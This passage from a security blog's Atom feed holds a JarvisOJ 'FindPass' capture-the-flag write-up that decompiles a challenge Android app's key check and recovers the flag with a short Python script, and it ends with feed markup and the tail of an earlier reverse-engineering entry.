cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d033646d31a116716.png" alt="903673-20170526160217544-91070169.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="JarvisOJ" scheme="https://mrh1s.top/categories/write-up/JarvisOJ/"/>
    
    
      <category term="RE_Dynamic" scheme="https://mrh1s.top/tags/RE-Dynamic/"/>
    
      <category term="RE_Static" scheme="https://mrh1s.top/tags/RE-Static/"/>
    
      <category term="packer" scheme="https://mrh1s.top/tags/packer/"/>
    
  </entry>
  
  <entry>
    <title>JarvisOJ-findpass</title>
    <link href="https://mrh1s.top/posts/512d4c5b/"/>
    <id>https://mrh1s.top/posts/512d4c5b/</id>
    <published>2019-06-13T16:00:52.000Z</published>
    <updated>2020-03-04T14:05:52.839Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>FindPass</h1><p><a href="/uploads/FindPass_200.7z">FindPass_200.7z</a></p><h2 id="思路">思路</h2><p>用jeb3.0解包apk文件，打开mainactivity，发现一个Getkey函数，思路非常明显</p><p>程序读取了src.jpg、fkey、input的内容，并且进行一定的加密操作，获得flag</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetKey</span><span class="params">(View arg16)</span> </span>&#123;</span><br><span class="line">        String input = <span class="keyword">this</span>.findViewById(<span class="number">0x7F080001</span>).getText().toString();</span><br><span class="line">        <span class="keyword">if</span>(TextUtils.isEmpty(input.trim())) &#123;</span><br><span class="line">            goto label_57;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>[] fkey = <span class="keyword">this</span>.getResources().getString(<span class="number">0x7F050003</span>).toCharArray();</span><br><span class="line">        <span class="keyword">int</span> v2 = fkey.length;</span><br><span class="line">        <span class="keyword">char</span>[] from_jpg = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">0x400</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> InputStreamReader(<span class="keyword">this</span>.getResources().getAssets().open(<span class="string">"src.jpg"</span>)).read(from_jpg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v3) &#123;</span><br><span class="line">            v3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v6;</span><br><span class="line">        <span class="keyword">for</span>(v6 = <span class="number">0</span>; v6 &lt; v2; ++v6) &#123;</span><br><span class="line">            <span class="keyword">int</span> v12 = from_jpg[fkey[v6]] % <span class="number">10</span>;</span><br><span class="line">            fkey[v6] = v6 % <span class="number">2</span> == <span class="number">1</span> ? ((<span class="keyword">char</span>)(fkey[v6] + v12)) : ((<span class="keyword">char</span>)(fkey[v6] - v12));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(input.equals(<span class="keyword">new</span> String(fkey))) &#123;</span><br><span class="line">            Toast.makeText(((Context)<span class="keyword">this</span>), <span class="string">"恭喜您，输入正确！Flag==flag&#123;Key&#125;"</span>, <span class="number">1</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(((Context)<span class="keyword">this</span>), <span class="string">"not right! lol。。。。"</span>, <span class="number">1</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        label_57:</span><br><span class="line">            Toast.makeText(((Context)<span class="keyword">this</span>), <span class="string">"请输入key值！"</span>, <span class="number">1</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>唯一有一点问题就是那个</p><blockquote><p>char[] fkey = this.getResources().getString(0x7F050003).toCharArray()</p></blockquote><p>经多方询问，最后明白这是一个读取内置字符串的函数，我们可以在</p><blockquote><p>Resources/values/strings.xml</p></blockquote><p>内找到，大多数的安卓软件都会把字符串放在这里面</p><h2 id="solve">solve</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fkey = <span class="string">"Tr43Fla92Ch4n93"</span></span><br><span class="line">fromjpg = [<span class="number">0xFF</span>,<span class="number">0xD8</span>,<span class="number">0xFF</span>,<span class="number">0xE0</span>,<span class="number">0x00</span>,<span class="number">0x10</span>,<span class="number">0x4A</span>,<span class="number">0x46</span>,<span class="number">0x49</span>,<span class="number">0x46</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xFF</span>,<span class="number">0xE1</span>,<span class="number">0x00</span>,<span class="number">0x30</span>,<span class="number">0x45</span>,<span class="number">0x78</span>,<span class="number">0x69</span>,<span class="number">0x66</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4D</span>,<span class="number">0x4D</span>,<span class="number">0x00</span>,<span class="number">0x2A</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x31</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x1A</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x2E</span>,<span class="number">0x6D</span>,<span class="number">0x65</span>,<span class="number">0x69</span>,<span class="number">0x74</span>,<span class="number">0x75</span>,<span class="number">0x2E</span>,<span class="number">0x63</span>,<span class="number">0x6F</span>,<span class="number">0x6D</span>,<span class="number">0x00</span>,<span class="number">0xFF</span>,<span class="number">0xDB</span>,<span class="number">0x00</span>,<span class="number">0x43</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x03</span>,<span class="number">0x03</span>,<span class="number">0x03</span>,<span class="number">0x04</span>,<span class="number">0x03</span>,<span class="number">0x03</span>,<span class="number">0x04</span>,<span class="number">0x05</span>,<span class="number">0x08</span>,<span class="number">0x05</span>,<span class="number">0x05</span>,<span class="number">0x04</span>,<span class="number">0x04</span>,<span class="number">0x05</span>,<span class="number">0x0A</span>,<span class="number">0x07</span>,<span class="number">0x07</span>,<span class="number">0x06</span>,<span class="number">0x08</span>,<span class="number">0x0C</span>,<span class="number">0x0A</span>,<span class="number">0x0C</span>,<span class="number">0x0C</span>,<span class="number">0x0B</span>,<span class="number">0x0A</span>,<span class="number">0x0B</span>,<span class="number">0x0B</span>,<span class="number">0x0D</span>,<span class="number">0x0E</span>,<span class="number">0x12</span>,<span class="number">0x10</span>,<span class="number">0x0D</span>,<span class="number">0x0E</span>,<span class="number">0x11</span>,<span class="number">0x0E</span>,<span class="number">0x0B</span>,<span class="number">0x0B</span>,<span class="number">0x10</span>,<span class="number">0x16</span>,<span class="number">0x10</span>,<span class="number">0x11</span>]</span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(fkey)):</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">1</span>):</span><br><span class="line">        t = ord(fkey[i]) + (fromjpg[ord(fkey[i])] % <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = ord(fkey[i]) - (fromjpg[ord(fkey[i])] % <span class="number">10</span>)</span><br><span class="line">    ans = ans + chr(t)</span><br><span class="line"></span><br><span class="line">ans = <span class="string">"flag&#123;"</span> + ans + <span class="string">"&#125;"</span></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="JarvisOJ" scheme="https://mrh1s.top/categories/write-up/JarvisOJ/"/>
    
    
      <category term="RE_Static" scheme="https://mrh1s.top/tags/RE-Static/"/>
    
      <category term="RE_Android" scheme="https://mrh1s.top/tags/RE-Android/"/>
    
  </entry>
  
</feed>
